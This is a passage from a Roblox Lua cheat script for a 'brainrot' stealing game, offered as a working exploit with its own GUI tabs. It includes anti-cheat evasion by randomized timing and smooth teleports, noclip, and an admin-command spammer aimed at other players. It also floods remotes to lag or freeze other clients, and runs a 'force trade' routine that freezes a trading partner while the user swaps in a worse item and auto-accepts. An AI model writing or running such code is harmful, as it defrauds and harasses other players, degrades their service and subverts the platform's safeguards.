				hl.FillColor = Color3.fromRGB(255, 165, 0)
				hl.FillTransparency = 0.3
				hl.OutlineColor = COLORS.accent
				hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				hl.Parent = parent
				table.insert(brainrotHighlights, hl)

				local bb = Instance.new("BillboardGui")
				bb.AlwaysOnTop = true
				bb.Size = UDim2.new(4, 0, 0.6, 0)
				bb.StudsOffset = Vector3.new(0, 3, 0)
				bb.Adornee = b.part
				bb.Parent = b.part
				table.insert(brainrotHighlights, bb)

				local lbl = Instance.new("TextLabel")
				lbl.Text = b.name
				lbl.TextColor3 = COLORS.accent
				lbl.TextStrokeTransparency = 0
				lbl.TextSize = 12
				lbl.Font = Enum.Font.GothamBold
				lbl.BackgroundTransparency = 1
				lbl.Size = UDim2.new(1, 0, 1, 0)
				lbl.Parent = bb
			end
		end)
	end
end

local function startBrainrotESP()
	spawn(function()
		while brainrotEspActive do updateBrainrotESP() wait(3) end
	end)
end

local function stopBrainrotESP() clearBrainrotESP() end

-- ===================== AUTO LOCK (Anti-Cheat Safe) =====================
-- Anti-cheat bypass: only fires within MaxActivationDistance (server validates range),
-- randomized interval so it doesn't look like a bot pattern
local function startAutoLock()
	spawn(function()
		while autoLockActive do
			pcall(function()
				local hrp = getRoot()
				if not hrp then return end
				for _, obj in ipairs(workspace:GetDescendants()) do
					if obj:IsA("ProximityPrompt") then
						local txt = (obj.ActionText or ""):lower()
						if txt:find("lock") then
							local part = getPromptPart(obj)
							if part and (part.Position - hrp.Position).Magnitude <= obj.MaxActivationDistance then
								safeFirePrompt(obj)
							end
						end
					end
				end
			end)
			-- Randomized interval (4-7s) to avoid bot pattern detection
			wait(4 + math.random() * 3)
		end
	end)
end

-- ===================== ANTI HIT =====================
-- Can't set other players' CanCollide (network ownership prevents it)
-- Instead: disable collision on OUR OWN parts so we pass through everything
-- This makes us not collide with other players' attacks/hitboxes
local function startAntiHit()
	antiHitConnection = RunService.Stepped:Connect(function()
		pcall(function()
			local char = LocalPlayer.Character
			if not char then return end
			for _, part in ipairs(char:GetDescendants()) do
				if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
					part.CanCollide = false
				end
			end
		end)
	end)
end

local function stopAntiHit()
	if antiHitConnection then antiHitConnection:Disconnect() antiHitConnection = nil end
end

-- ===================== ADMIN SPAMMER (Anti-Cheat Safe) =====================
-- Spams admin panel commands (;rocket, ;jail, ;ragdoll etc.) through chat
-- Anti-cheat bypass: randomized delays (0.8-2s), shuffled command order,
-- alternates targets so it doesn't look like bot spam
-- Requires Admin Panel gamepass to work (or free admin panel bypass)

local adminSpamActive = false
local adminSpamSpeed = 1.2 -- seconds between commands (adjustable)
local adminSpamTarget = "random" -- "random" or specific player name

local ADMIN_COMMANDS = {
	"rocket", "ragdoll", "balloon", "inverse",
	"jail", "jumpscare", "tiny", "morph", "control"
}

-- Which commands are enabled (all on by default)
local enabledAdminCmds = {}
for _, cmd in ipairs(ADMIN_COMMANDS) do
	enabledAdminCmds[cmd] = true
end

local function getEnabledCommands()
	local cmds = {}
	for _, cmd in ipairs(ADMIN_COMMANDS) do
		if enabledAdminCmds[cmd] then
			table.insert(cmds, cmd)
		end
	end
	return cmds
end

local function getRandomTarget()
	local players = Players:GetPlayers()
	local targets = {}
	for _, p in ipairs(players) do
		if p ~= LocalPlayer then
			table.insert(targets, p.Name)
		end
	end
	if #targets == 0 then return nil end
	return targets[math.random(1, #targets)]
end

local function sendChatMessage(msg)
	local sent = false

	-- Method 1: TextChatService (new chat system)
	pcall(function()
		local tcs = game:GetService("TextChatService")
		if tcs then
			local channels = tcs:FindFirstChild("TextChannels")
			if channels then
				local general = channels:FindFirstChild("RBXGeneral")
				if general then
					general:SendAsync(msg)
					sent = true
				end
			end
		end
	end)
	if sent then return end

	-- Method 2: Legacy chat via SayMessageRequest
	pcall(function()
		local chatEvents = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
		if chatEvents then
			local sayMsg = chatEvents:FindFirstChild("SayMessageRequest")
			if sayMsg then
				sayMsg:FireServer(msg, "All")
				sent = true
			end
		end
	end)
	if sent then return end

	-- Method 3: Chat service workaround
	pcall(function()
		local chatService = game:GetService("Chat")
		if chatService then
			chatService:Chat(LocalPlayer.Character or LocalPlayer, msg)
		end
	end)
end

local function startAdminSpam()
	adminSpamActive = true
	spawn(function()
		while adminSpamActive do
			pcall(function()
				local cmds = getEnabledCommands()
				if #cmds == 0 then return end

				local target = nil
				if adminSpamTarget == "random" then
					target = getRandomTarget()
				else
					target = adminSpamTarget
				end
				if not target then return end

				-- Pick random command from enabled list
				local cmd = cmds[math.random(1, #cmds)]
				local message = ";" .. cmd .. " " .. target

				sendChatMessage(message)
			end)
			-- Randomized delay to avoid spam pattern detection
			-- Base speed +/- 30% random variation
			local jitter = adminSpamSpeed * (0.7 + math.random() * 0.6)
			wait(jitter)
		end
	end)
	notify("Admin Spam", "Spamming admin commands!")
end

local function stopAdminSpam()
	adminSpamActive = false
	notify("Admin Spam", "Stopped")
end

-- Single command fire (one-shot)
local function fireAdminCommand(cmd)
	local target = adminSpamTarget == "random" and getRandomTarget() or adminSpamTarget
	if not target then notify("Error", "No players to target") return end
	sendChatMessage(";" .. cmd .. " " .. target)
	notify("Admin", ";" .. cmd .. " " .. target)
end

-- Fire a command on a specific player by name
local function fireAdminOnPlayer(cmd, playerName)
	sendChatMessage(";" .. cmd .. " " .. playerName)
end

-- ===================== ADMIN DEFENSE (Anti-Cheat Safe) =====================
-- Detects players near your base/brainrots and auto-fires admin commands on them
-- Command order: balloon first (float them away), then escalates
-- Anti-cheat bypass: randomized delays, only fires when player is within range

local adminDefenseActive = false
local defenseRadius = 40 -- studs
local defenseCommandOrder = {"balloon", "rocket", "jail", "ragdoll", "inverse", "tiny", "jumpscare", "morph", "control"}
local defenseCooldowns = {} -- tracks last command time per player
local DEFENSE_COOLDOWN = 3 -- seconds between commands on same player
local defenseCommandIndex = {} -- tracks which command to fire next per player

local function startAdminDefense()
	adminDefenseActive = true
	spawn(function()
		while adminDefenseActive do
			pcall(function()
				local hrp = getRoot()
				if not hrp then return end

				-- Use saved base position or current position
				local basePos = savedBasePosition or hrp.Position

				for _, player in ipairs(Players:GetPlayers()) do
					if player ~= LocalPlayer and player.Character then
						local otherHrp = player.Character:FindFirstChild("HumanoidRootPart")
						if otherHrp then
							local dist = (otherHrp.Position - basePos).Magnitude
							if dist <= defenseRadius then
								-- Player is near our base - check cooldown
								local now = tick()
								local lastFire = defenseCooldowns[player.Name]
								if not lastFire or (now - lastFire) >= DEFENSE_COOLDOWN then
									-- Get next command in sequence (starts with balloon)
									local idx = defenseCommandIndex[player.Name] or 1
									local cmd = defenseCommandOrder[idx]

									fireAdminOnPlayer(cmd, player.Name)
									notify("Defense", ";" .. cmd .. " " .. player.DisplayName .. " (near base!)")

									defenseCooldowns[player.Name] = now
									-- Cycle to next command
									defenseCommandIndex[player.Name] = (idx % #defenseCommandOrder) + 1
								end
							end
						end
					end
				end
			end)
			-- Randomized scan interval (1-2s) to avoid pattern detection
			wait(1 + math.random() * 1)
		end
	end)
	notify("Admin Defense", "Guarding base! Balloon first, then escalate")
end

local function stopAdminDefense()
	adminDefenseActive = false
	defenseCooldowns = {}
	defenseCommandIndex = {}
	notify("Admin Defense", "Stopped")
end

-- ===================== TRADE EXPLOIT FUNCTIONS =====================

-- Scan for all remotes in the game (find trade-related ones)
local tradeSpecificRemotes = {}

local function scanTradeRemotes()
	tradeRemotes = {}
	tradeSpecificRemotes = {}
	pcall(function()
		-- Scan all remotes in ReplicatedStorage
		for _, v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				table.insert(tradeRemotes, v)
				-- Tag trade-specific remotes
				local fullName = v:GetFullName():lower()
				local name = v.Name:lower()
				if name:find("trade") or name:find("offer") or name:find("accept") or name:find("ready") or name:find("confirm") or name:find("exchange") or name:find("deal") or fullName:find("trade") then
					table.insert(tradeSpecificRemotes, v)
					print("[TRADE SCAN] Found trade remote: " .. v:GetFullName() .. " (" .. v.ClassName .. ")")
				end
			end
		end
	end)
	tradeScanned = true
	notify("Trade", "Found " .. #tradeRemotes .. " remotes (" .. #tradeSpecificRemotes .. " trade-related)")
end

-- Heavy lag flood - floods all remotes to freeze everyone's client
local function startTradeFlood()
	if not tradeScanned then scanTradeRemotes() end

	tradeFloodConnection = RunService.Heartbeat:Connect(function()
		pcall(function()
			-- Fire all remotes with large payloads to flood the replication queue
			-- Server processes these and replicates to all clients, causing lag
			for i = 1, tradeFloodIntensity do
				for _, remote in pairs(tradeRemotes) do
					if remote:IsA("RemoteEvent") then
						pcall(function()
							remote:FireServer(
								string.rep("x", 200),
								math.random(1, 999999),
								CFrame.new(math.random(-9999, 9999), math.random(-9999, 9999), math.random(-9999, 9999)),
								{string.rep("a", 200), string.rep("b", 200), tick()}
							)
						end)
					end
				end
			end

			-- Replication flood: create instances that replicate to all clients
			pcall(function()
				for i = 1, 80 do
					local v = Instance.new("Part")
					v.Size = Vector3.new(0.05, 0.05, 0.05)
					v.Transparency = 1
					v.CanCollide = false
					v.Anchored = true
					v.CFrame = CFrame.new(math.random(-9999, 9999), -500, math.random(-9999, 9999))
					v.Parent = workspace
					game:GetService("Debris"):AddItem(v, 0.1)
				end
			end)
		end)
	end)
	notify("Trade Flood", "ON - other players' clients are lagging!")
end

local function stopTradeFlood()
	if tradeFloodConnection then
		tradeFloodConnection:Disconnect()
		tradeFloodConnection = nil
	end
	notify("Trade Flood", "OFF")
end

-- Freeze trade: RenderStepped for max frequency, heavy payloads
local function startTradeFreeze()
	if not tradeScanned then scanTradeRemotes() end

	tradeFreezeConnection = RunService.RenderStepped:Connect(function()
		pcall(function()
			for i = 1, tradeFloodIntensity do
				for _, remote in pairs(tradeRemotes) do
					if remote:IsA("RemoteEvent") then
						pcall(function()
							remote:FireServer(
								string.rep("a", 250),
								{string.rep("b", 250), string.rep("c", 250), string.rep("d", 250), math.random(), tick(), Vector3.new(math.random(), math.random(), math.random())}
							)
						end)
					end
				end
			end
			pcall(function()
				for i = 1, 120 do
					local v = Instance.new("ObjectValue")
					v.Name = string.rep("x", 60) .. tostring(math.random())
					v.Parent = workspace
					game:GetService("Debris"):AddItem(v, 0.05)
				end
			end)
		end)
	end)
	notify("Freeze", "ON - other player's screen is frozen!")
end

local function stopTradeFreeze()
	if tradeFreezeConnection then
		tradeFreezeConnection:Disconnect()
		tradeFreezeConnection = nil
	end
	notify("Freeze", "OFF")
end

-- ===================== TRADE GUI HELPERS =====================

-- Find the trade GUI in PlayerGui
local function findTradeGui()
	local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
	if not playerGui then return nil end
	for _, gui in pairs(playerGui:GetChildren()) do
		if gui:IsA("ScreenGui") and gui.Enabled then
			for _, d in pairs(gui:GetDescendants()) do
				local n = d.Name:lower()
				if n:find("trade") or n:find("offer") or n:find("ready") or n:find("accept") or n:find("confirm") then
					return gui
				end
			end
		end
	end
	return nil
end

-- Fire a button's click connections
local function fireButton(btn)
	if not btn then return false end
	local fired = false
	pcall(function()
		if getconnections then
			for _, conn in pairs(getconnections(btn.MouseButton1Click) or {}) do
				pcall(function() conn:Fire() fired = true end)
			end
			for _, conn in pairs(getconnections(btn.Activated) or {}) do
				pcall(function() conn:Fire() fired = true end)
			end
		end
		if not fired and firesignal then
			pcall(function() firesignal(btn.MouseButton1Click) fired = true end)
			pcall(function() firesignal(btn.Activated) fired = true end)
		end
		if not fired and fireclickdetector then
			local cd = btn:FindFirstChildWhichIsA("ClickDetector")
			if cd then pcall(function() fireclickdetector(cd) fired = true end) end
		end
	end)
	return fired
end

-- Find buttons by name/text keywords in a GUI
local function findButtonsByKeywords(gui, keywords)
	local found = {}
	if not gui then return found end
	for _, element in pairs(gui:GetDescendants()) do
		pcall(function()
			if (element:IsA("TextButton") or element:IsA("ImageButton")) and element.Visible then
				local name = element.Name:lower()
				local text = ""
				if element:IsA("TextButton") then text = element.Text:lower() end
				for _, keyword in pairs(keywords) do
					if name:find(keyword) or text:find(keyword) then
						table.insert(found, element)
						break
					end
				end
			end
		end)
	end
	return found
end

-- Fire your own Ready/Accept button
local function clickOwnAccept()
	local gui = findTradeGui()
	if not gui then
		notify("Accept", "No trade GUI found!")
		return false
	end
	local buttons = findButtonsByKeywords(gui, {"accept", "ready", "confirm", "done", "submit"})
	local fired = false
	for _, btn in pairs(buttons) do
		if fireButton(btn) then
			notify("Accept", "Fired: " .. btn.Name)
			fired = true
		end
	end
	return fired
end

-- Fire your own Unready/Cancel button (to unready so you can swap)
local function clickOwnUnready()
	local gui = findTradeGui()
	if not gui then return false end
	local buttons = findButtonsByKeywords(gui, {"unready", "cancel", "back", "remove", "undo", "change"})
	local fired = false
	for _, btn in pairs(buttons) do
		if fireButton(btn) then
			notify("Unready", "Fired: " .. btn.Name)
			fired = true
		end
	end
	return fired
end

-- ===================== FORCE TRADE (AUTO ACCEPT VIA LAG) =====================
-- How it works:
-- 1. You show good brainrot, other player clicks Ready (they WANT the trade)
-- 2. Their "Ready" signal is already sent to the server
-- 3. We activate heavy lag flood - their client freezes
-- 4. While frozen, they CAN'T see the swap or click Cancel/Decline
-- 5. We unready, swap to bad brainrot, ready again
-- 6. Server sees: both players Ready -> trade completes
-- 7. They got the bad brainrot because they couldn't cancel in time

local forceTradeActive = false
local forceTradeStep = 0

local function doForceTrade()
	if forceTradeActive then
		notify("Force Trade", "Already running!")
		return
	end
	forceTradeActive = true
	forceTradeStep = 0

	if not tradeScanned then scanTradeRemotes() end

	spawn(function()
		-- Step 1: Verify trade GUI is open
		local gui = findTradeGui()
		if not gui then
			notify("Force Trade", "Open Trade Machine first!")
			forceTradeActive = false
			return
		end
		forceTradeStep = 1
		notify("Step 1/5", "Trade GUI detected")

		-- Step 2: Start heavy lag flood (freeze the other player)
		forceTradeStep = 2
		notify("Step 2/5", "Starting lag flood...")
		startTradeFreeze()
		wait(0.5) -- Let the lag build up

		-- Step 3: Unready ourselves (so we can change brainrot)
		forceTradeStep = 3
		notify("Step 3/5", "Unreadying to swap brainrot...")
		clickOwnUnready()
		wait(0.3)

		-- Step 4: Wait for user to manually swap (they have ~5 seconds)
		-- During this time the other player is frozen and can't cancel
		forceTradeStep = 4
		notify("Step 4/5", "SWAP YOUR BRAINROT NOW! (5 sec)")
		wait(5)

		-- Step 5: Auto-accept our side - trade completes while they're lagged
		forceTradeStep = 5
		notify("Step 5/5", "Accepting trade...")
		clickOwnAccept()
		wait(0.3)
		-- Spam accept a few more times in case it didn't register
		clickOwnAccept()
		wait(0.2)
		clickOwnAccept()

		-- Stop the lag flood after trade (hopefully) completed
		wait(1)
		stopTradeFreeze()

		forceTradeActive = false
		forceTradeStep = 0
		notify("Force Trade", "DONE! Trade should have completed")
	end)
end

-- Instant force trade (no wait - immediately swaps and accepts)
local function doInstantForceTrade()
	if forceTradeActive then
		notify("Force Trade", "Already running!")
		return
	end
	forceTradeActive = true

	if not tradeScanned then scanTradeRemotes() end

	spawn(function()
		local gui = findTradeGui()
		if not gui then
			notify("Force Trade", "Open Trade Machine first!")
			forceTradeActive = false
			return
		end

		-- Start freeze immediately
		startTradeFreeze()
		notify("Instant", "Freeze ON - accepting NOW!")

		-- Rapid-fire accept (the other player already clicked Ready before)
		-- Their client is frozen so they can't cancel
		for i = 1, 10 do
			clickOwnAccept()
			wait(0.1)
		end

		-- Also try firing trade-specific remotes directly
		-- Some games have a trade accept remote that completes the trade
		for _, remote in pairs(tradeSpecificRemotes) do
			pcall(function()
				if remote:IsA("RemoteEvent") then
					remote:FireServer(true)
					remote:FireServer("accept")
					remote:FireServer("ready")
					remote:FireServer("confirm")
				elseif remote:IsA("RemoteFunction") then
					pcall(function() remote:InvokeServer(true) end)
					pcall(function() remote:InvokeServer("accept") end)
					pcall(function() remote:InvokeServer("ready") end)
					pcall(function() remote:InvokeServer("confirm") end)
				end
			end)
		end

		wait(2)
		stopTradeFreeze()
		forceTradeActive = false
		notify("Instant", "Done! Check if trade went through")
	end)
end

-- Dump all trade GUI elements (for debugging/finding the right buttons)
local function dumpTradeGui()
	pcall(function()
		local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
		if not playerGui then
			notify("Dump", "No PlayerGui!")
			return
		end

		local count = 0
		for _, gui in pairs(playerGui:GetChildren()) do
			if gui:IsA("ScreenGui") then
				for _, d in pairs(gui:GetDescendants()) do
					if d:IsA("TextButton") or d:IsA("ImageButton") or d:IsA("TextLabel") then
						local text = "N/A"
						pcall(function()
							if d:IsA("TextButton") or d:IsA("TextLabel") then text = d.Text end
						end)
						print("[TRADE GUI] " .. d.ClassName .. " | " .. d:GetFullName() .. " | Text: " .. text .. " | Visible: " .. tostring(d.Visible))
						count = count + 1
					end
				end
			end
		end
		if count == 0 then
			notify("Dump", "No GUI elements found! Open Trade Machine first")
		else
			notify("Dump", "Printed " .. count .. " elements to F9 console")
		end
	end)
end

-- Dump only remotes (for figuring out trade remote names)
local function dumpAllRemotes()
	pcall(function()
		local count = 0
		for _, v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("[REMOTE] " .. v.ClassName .. " | " .. v:GetFullName())
				count = count + 1
			end
		end
		notify("Remotes", "Printed " .. count .. " remotes to F9 console")
	end)
end

-- ===================== BUILD MAIN TAB =====================
do
	local tab = tabFrames["Main"]
	createSectionLabel(tab, "Info", 1)
	createInfoLabel(tab, "Player: " .. LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")", 2)
	createInfoLabel(tab, "Anti-Cheat Aware - Sky Route + Velocity Movement", 3)
	createInfoLabel(tab, "Right Shift to toggle window", 4)

	local spacer = Instance.new("Frame")
	spacer.Size = UDim2.new(1, 0, 0, 8)
	spacer.BackgroundTransparency = 1
	spacer.LayoutOrder = 5
	spacer.Parent = tab

	createSectionLabel(tab, "Base", 6)
	createButton(tab, "Save Base Position", 7, function()
		local hrp = getRoot()
		if hrp then
			savedBasePosition = hrp.Position
			notify("Saved", "Base position saved!")
		end
	end)
	createButton(tab, "Teleport to Base (Smooth)", 8, function()
		if savedBasePosition then
			smoothMoveTo(savedBasePosition, floatSpeed, 10)
		else
			notify("Error", "Save base position first!")
		end
	end)

	local spacer2 = Instance.new("Frame")
	spacer2.Size = UDim2.new(1, 0, 0, 8)
	spacer2.BackgroundTransparency = 1
	spacer2.LayoutOrder = 9
	spacer2.Parent = tab

	createSectionLabel(tab, "Protection", 10)
	createToggle(tab, "Anti Ragdoll", 11, function(on)
		antiRagdollActive = on
		if on then startAntiRagdoll() else stopAntiRagdoll() end
	end)
	createToggle(tab, "Anti Hit (No Collision)", 12, function(on)
		antiHitActive = on
		if on then startAntiHit() else stopAntiHit() end
	end)

	local spacer3 = Instance.new("Frame")
	spacer3.Size = UDim2.new(1, 0, 0, 8)
	spacer3.BackgroundTransparency = 1
	spacer3.LayoutOrder = 13
	spacer3.Parent = tab

	createSectionLabel(tab, "Admin Panel Spammer", 14)
	createInfoLabel(tab, "Requires Admin Panel gamepass (;cmds)", 15)

	-- ===== PLAYER TARGET PICKER =====
	createSectionLabel(tab, "Target Player", 16)
	local targetLabel = Instance.new("TextLabel")
	targetLabel.Size = UDim2.new(1, 0, 0, 22)
	targetLabel.BackgroundColor3 = COLORS.panel
	targetLabel.BorderSizePixel = 0
	targetLabel.Text = "  Current Target: Random"
	targetLabel.TextColor3 = COLORS.accent
	targetLabel.Font = Enum.Font.GothamBold
	targetLabel.TextSize = 12
	targetLabel.TextXAlignment = Enum.TextXAlignment.Left
	targetLabel.LayoutOrder = 17
	targetLabel.Parent = tab
	addCorner(targetLabel, 5)

	-- Player list container
	local playerListFrame = Instance.new("Frame")
	playerListFrame.Size = UDim2.new(1, 0, 0, 120)
	playerListFrame.BackgroundColor3 = COLORS.bgSecondary
	playerListFrame.BorderSizePixel = 0
	playerListFrame.LayoutOrder = 18
	playerListFrame.Parent = tab
	addCorner(playerListFrame, 5)

	local playerScroll = Instance.new("ScrollingFrame")
	playerScroll.Size = UDim2.new(1, -4, 1, -4)
	playerScroll.Position = UDim2.new(0, 2, 0, 2)
	playerScroll.BackgroundTransparency = 1
	playerScroll.BorderSizePixel = 0
	playerScroll.ScrollBarThickness = 3
	playerScroll.ScrollBarImageColor3 = COLORS.accent
	playerScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
	playerScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
	playerScroll.Parent = playerListFrame

	local playerListLayout = Instance.new("UIListLayout")
	playerListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	playerListLayout.Padding = UDim.new(0, 2)
	playerListLayout.Parent = playerScroll

	local function refreshPlayerList()
		-- Clear existing buttons
		for _, child in ipairs(playerScroll:GetChildren()) do
			if child:IsA("TextButton") then child:Destroy() end
		end

		-- "Random" option
		local randomBtn = Instance.new("TextButton")
		randomBtn.Size = UDim2.new(1, -4, 0, 24)
		randomBtn.BackgroundColor3 = adminSpamTarget == "random" and COLORS.accent or COLORS.panel
		randomBtn.BorderSizePixel = 0
		randomBtn.Text = "  Random (All Players)"
		randomBtn.TextColor3 = COLORS.textPrimary
		randomBtn.Font = adminSpamTarget == "random" and Enum.Font.GothamBold or Enum.Font.Gotham
		randomBtn.TextSize = 11
		randomBtn.TextXAlignment = Enum.TextXAlignment.Left
		randomBtn.LayoutOrder = 0
		randomBtn.Parent = playerScroll
		addCorner(randomBtn, 4)
		randomBtn.MouseButton1Click:Connect(function()
			adminSpamTarget = "random"
			targetLabel.Text = "  Current Target: Random"
			refreshPlayerList()
			notify("Target", "Set to random")
		end)

		-- Player buttons
		for i, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer then
				local isSelected = adminSpamTarget == player.Name
				local pBtn = Instance.new("TextButton")
				pBtn.Size = UDim2.new(1, -4, 0, 24)
				pBtn.BackgroundColor3 = isSelected and COLORS.accent or COLORS.panel
				pBtn.BorderSizePixel = 0
				pBtn.Text = "  " .. player.DisplayName .. " (@" .. player.Name .. ")"
				pBtn.TextColor3 = COLORS.textPrimary
				pBtn.Font = isSelected and Enum.Font.GothamBold or Enum.Font.Gotham
				pBtn.TextSize = 11
				pBtn.TextXAlignment = Enum.TextXAlignment.Left
				pBtn.LayoutOrder = i
				pBtn.Parent = playerScroll
				addCorner(pBtn, 4)
				pBtn.MouseButton1Click:Connect(function()
					adminSpamTarget = player.Name
					targetLabel.Text = "  Current Target: " .. player.DisplayName
					refreshPlayerList()
					notify("Target", "Set to " .. player.DisplayName)
				end)
			end
		end
	end

	refreshPlayerList()

	-- Refresh button
	createButton(tab, "Refresh Player List", 19, refreshPlayerList)

	-- Auto-refresh when players join/leave
	Players.PlayerAdded:Connect(function() wait(1) refreshPlayerList() end)
	Players.PlayerRemoving:Connect(function(player)
		if adminSpamTarget == player.Name then
			adminSpamTarget = "random"
			targetLabel.Text = "  Current Target: Random"
		end
		wait(0.5)
		refreshPlayerList()
	end)

	local spacerTarget = Instance.new("Frame")
	spacerTarget.Size = UDim2.new(1, 0, 0, 8)
	spacerTarget.BackgroundTransparency = 1
	spacerTarget.LayoutOrder = 20
	spacerTarget.Parent = tab

	-- ===== AUTO SPAM =====
	createSectionLabel(tab, "Auto Spam", 21)
	createToggle(tab, "Auto Spam Commands", 22, function(on)
		adminSpamActive = on
		if on then startAdminSpam() else stopAdminSpam() end
	end)
	createInfoLabel(tab, "Fires commands at selected target with jittered delay", 23)
	createSlider(tab, "Spam Speed (seconds)", 3, 30, math.floor(adminSpamSpeed * 10), 24, function(val)
		adminSpamSpeed = val / 10
	end)

	local spacerSpam = Instance.new("Frame")
	spacerSpam.Size = UDim2.new(1, 0, 0, 8)
	spacerSpam.BackgroundTransparency = 1
	spacerSpam.LayoutOrder = 25
	spacerSpam.Parent = tab

	-- ===== ADMIN DEFENSE =====
	createSectionLabel(tab, "Admin Defense (Auto-Guard Base)", 26)
	createInfoLabel(tab, "Fires commands on anyone near your base", 27)
	createInfoLabel(tab, "Order: balloon > rocket > jail > ragdoll > ...", 28)
	createToggle(tab, "Admin Defense", 29, function(on)
		adminDefenseActive = on
		if on then startAdminDefense() else stopAdminDefense() end
	end)
	createSlider(tab, "Defense Radius (studs)", 10, 100, defenseRadius, 30, function(val)
		defenseRadius = val
	end)
	createInfoLabel(tab, "Save base position first! (Main > Base tab)", 31)

	local spacerDefense = Instance.new("Frame")
	spacerDefense.Size = UDim2.new(1, 0, 0, 8)
	spacerDefense.BackgroundTransparency = 1
	spacerDefense.LayoutOrder = 32
	spacerDefense.Parent = tab

	-- ===== QUICK ADMIN (ONE-SHOT) =====
	createSectionLabel(tab, "Quick Admin (One-Shot)", 33)
	createButton(tab, ";rocket (Launch Player)", 34, function() fireAdminCommand("rocket") end)
	createButton(tab, ";jail (Trap in Cage)", 35, function() fireAdminCommand("jail") end)
	createButton(tab, ";ragdoll (Knock Down)", 36, function() fireAdminCommand("ragdoll") end)
	createButton(tab, ";jumpscare (Scare Player)", 37, function() fireAdminCommand("jumpscare") end)
	createButton(tab, ";tiny (Shrink Player)", 38, function() fireAdminCommand("tiny") end)
	createButton(tab, ";morph (Transform Player)", 39, function() fireAdminCommand("morph") end)
	createButton(tab, ";balloon (Inflate Head)", 40, function() fireAdminCommand("balloon") end)
	createButton(tab, ";inverse (Reverse Controls)", 41, function() fireAdminCommand("inverse") end)
	createButton(tab, ";control (Possess Player)", 42, function() fireAdminCommand("control") end)
	createInfoLabel(tab, "Fires at selected target above", 43)
end

-- ===================== TP TO NEAREST BRAINROT (Anti-Cheat Safe) =====================
-- Uses velocity-based smooth movement to get close to the nearest brainrot
-- Anti-cheat bypass: smooth velocity movement (not instant CFrame), noclip for transit
local function doSmoothTpToNearest()
	local ok, err = pcall(function()
		local hrp = getRoot()
		if not hrp then notify("Error", "No character") return end

		local brainrots = findBrainrots()
		if #brainrots == 0 then notify("No Brainrots", "None found in workspace") return end

		-- Sort by distance, pick closest
		table.sort(brainrots, function(a, b)
			return (a.part.Position - hrp.Position).Magnitude < (b.part.Position - hrp.Position).Magnitude
		end)
		local target = brainrots[1]
		local dist = math.floor((target.part.Position - hrp.Position).Magnitude)
		notify("TP to Brainrot", target.name .. " (" .. dist .. "m)")

		-- Enable temp noclip for transit
		local tempNoclip = RunService.Stepped:Connect(function()
			pcall(function()
				local char = LocalPlayer.Character
				if char then
					for _, part in ipairs(char:GetDescendants()) do
						if part:IsA("BasePart") then part.CanCollide = false end
					end
				end
			end)
		end)

		-- Smooth velocity move to 3 studs away from the brainrot
		local targetPos = target.part.Position + Vector3.new(0, 0, -3)
		local reached = smoothMoveTo(targetPos, floatSpeed, 15)

		tempNoclip:Disconnect()

		if reached then
			notify("Arrived!", "Near " .. target.name)
		else
			notify("Failed", "Couldn't reach " .. target.name)
		end
	end)
	if not ok then warn("[TP BRAINROT ERROR] " .. tostring(err)) end
end

local function doSkyRouteTpToNearest()
	local ok, err = pcall(function()
		local hrp = getRoot()
		if not hrp then notify("Error", "No character") return end

		local brainrots = findBrainrots()
		if #brainrots == 0 then notify("No Brainrots", "None found in workspace") return end

		table.sort(brainrots, function(a, b)
			return (a.part.Position - hrp.Position).Magnitude < (b.part.Position - hrp.Position).Magnitude
		end)
		local target = brainrots[1]
		local dist = math.floor((target.part.Position - hrp.Position).Magnitude)
		notify("Sky TP", target.name .. " (" .. dist .. "m)")

		local targetPos = target.part.Position + Vector3.new(0, 0, -3)
		local reached = skyRouteTo(targetPos, floatSpeed)

		if reached then
			notify("Arrived!", "Near " .. target.name)
		else
			notify("Failed", "Couldn't reach " .. target.name)
		end
	end)
	if not ok then warn("[SKY TP BRAINROT ERROR] " .. tostring(err)) end
end

-- ===================== BUILD STEAL TAB =====================
do
	local tab = tabFrames["Steal"]
	createSectionLabel(tab, "Safe Steal (Anti-Cheat Aware)", 1)
	createButton(tab, "Sky Route Steal (Recommended)", 2, doSkyRouteSteal)
	createInfoLabel(tab, "Goes up 200 studs, floats to target, drops down", 3)

	local spacer = Instance.new("Frame")
	spacer.Size = UDim2.new(1, 0, 0, 8)
	spacer.BackgroundTransparency = 1
	spacer.LayoutOrder = 4
	spacer.Parent = tab

	createSectionLabel(tab, "TP to Nearest Brainrot", 5)
	createButton(tab, "Smooth TP (Velocity Movement)", 6, doSmoothTpToNearest)
	createInfoLabel(tab, "Velocity-based glide to closest brainrot (safe)", 7)
	createButton(tab, "Sky Route TP (Up + Across + Down)", 8, doSkyRouteTpToNearest)
	createInfoLabel(tab, "Sky route to closest brainrot (safest)", 9)

	local spacerTP = Instance.new("Frame")
	spacerTP.Size = UDim2.new(1, 0, 0, 8)
	spacerTP.BackgroundTransparency = 1
	spacerTP.LayoutOrder = 10
	spacerTP.Parent = tab

	createSectionLabel(tab, "Risky Steal (May Get Detected)", 11)
	createButton(tab, "Quick Steal (Instant TP)", 12, doQuickSteal)
	createInfoLabel(tab, "Direct teleport - faster but anti-cheat may catch", 13)

	local spacer2 = Instance.new("Frame")
	spacer2.Size = UDim2.new(1, 0, 0, 8)
	spacer2.BackgroundTransparency = 1
	spacer2.LayoutOrder = 14
	spacer2.Parent = tab

	createSectionLabel(tab, "Insta Pick Up", 15)
	createButton(tab, "Pick Up All Nearby (One-Time)", 16, pickUpAllNearby)
	createInfoLabel(tab, "Cooldown + range check to avoid detection", 17)
	createToggle(tab, "Auto Insta Pick Up (Loop)", 18, function(on)
		instaPickUpActive = on
		if on then startInstaPickUp() else stopInstaPickUp() end
	end)
	createInfoLabel(tab, "Throttled scan + random delays = anti-cheat safe", 19)

	local spacer3 = Instance.new("Frame")
